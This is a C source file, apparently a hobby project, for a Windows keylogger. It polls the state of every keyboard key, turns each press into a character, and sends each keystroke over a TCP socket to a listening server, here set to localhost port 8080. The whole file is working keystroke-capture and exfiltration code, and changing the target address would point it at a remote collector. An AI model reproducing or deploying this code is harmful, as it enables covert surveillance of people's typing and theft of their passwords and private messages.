#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <psapi.h>

#define MSG_BUFF_LEN 5

void vkey_to_char(int vKey, char buffer[MSG_BUFF_LEN]) {
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);

    // Checks if shift key is being held down
    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
        keyboardState[VK_SHIFT] |= 0x80;
    }

    UINT scanCode = MapVirtualKey(vKey, MAPVK_VK_TO_VSC);
    WCHAR unicodeChar[4] = {0};
    int result = ToUnicode(vKey, scanCode, keyboardState, unicodeChar, 4, 0);

    if (result > 0) {
        if (unicodeChar[0] >= 32 && unicodeChar[0] <= 126) {
            buffer[0] = (char)unicodeChar[0];
            buffer[1] = '\0';
        } else if (unicodeChar[0] == 8) { // Backspace
            strcpy(buffer, "\xE2\x8C\xAB");
        } else if (unicodeChar[0] == 13) { // Enter
            strcpy(buffer, "\xE2\x86\xB5");
        } else {
            buffer[0] = '\0';
        }
    } else {
        buffer[0] = '\0';
    }
}

BOOL WINAPI ConsoleHandler(DWORD signal) {
    if (signal == CTRL_C_EVENT) {
        printf("\nCtrl+C received. Cleaning up...\n");
        // Optionally reset keyStates, send final message, etc.
        FlushConsoleInputBuffer(GetStdHandle(STD_INPUT_HANDLE));
        WSACleanup();
        exit(0);
    }
    return TRUE;
}

int main() {
    FlushConsoleInputBuffer(GetStdHandle(STD_INPUT_HANDLE));
    SetConsoleCtrlHandler(ConsoleHandler, TRUE);  // run control c event handler

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET client_socket;
    client_socket = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_port = htons(8080);

    if (connect(client_socket, (struct sockaddr*)&server, sizeof(server)) == -1) {
        // If there is not a successfull connection
        printf("%s", GetLastError());
        closesocket(client_socket);
        WSACleanup();
        return 1;
    }

    printf("Established Connection\n");

    for (int vKey = 0x08; vKey <= 0xFE; vKey++) {
        GetAsyncKeyState(vKey); // Clears LSB so only future presses are seen
    }
    
    char newMsgBuff[MSG_BUFF_LEN] = {0};
    // char prevMsgBuff[MSG_BUFF_LEN] = {0};

    BYTE keyStates[256] = {0};
    int holdClock = 0;

    while (1) {
        for (int vKey = 0x08; vKey <= 0xFE; vKey++) {
            // state is bit 1000 0000 0000 0000 if that key is down
            SHORT state = GetAsyncKeyState(vKey);
            // Key is now pressed but wasn't before, !keyStates[vKey] returns True if keyStates[vKey] is 0 / not 1
            if ((state & 0x8000) && !keyStates[vKey]) {
                keyStates[vKey] = 1;  // Mark as pressed

                vkey_to_char(vKey, newMsgBuff);  // modify vkey if necessary and add to buffer before sending

                if (vKey == VK_LCONTROL || vKey == VK_RCONTROL) {
                    strcpy(newMsgBuff, "\xC2\xA9");
                    printf("Control key pressed!\n");
                }

                if (newMsgBuff[0] != '\0') {
                    // printf("Typed: %s\n", newMsgBuff);
                    // we send upon a detected key press
                    send(client_socket, newMsgBuff, strlen(newMsgBuff), 0);
                }
            } else if ((state & 0x8000) && keyStates[vKey]) {  // held down state
                vkey_to_char(vKey, newMsgBuff);  // modify vkey if necessary and add to buffer before sending

                if (vKey == VK_LCONTROL || vKey == VK_RCONTROL) {
                    strcpy(newMsgBuff, "\xC2\xA9");
                }

                if (newMsgBuff[0] != '\0' && holdClock > 30) {
                    // printf("Typed: %s\n", newMsgBuff);
                    // we send upon a detected key press
                    send(client_socket, newMsgBuff, strlen(newMsgBuff), 0);
                }
                holdClock++;
            } else if (!(state & 0x8000) && keyStates[vKey]) {
                keyStates[vKey] = 0;  // Key is now released
                holdClock = 0;
            }
        }
        Sleep(10);  // 10ms delay
    }

    return 0;
}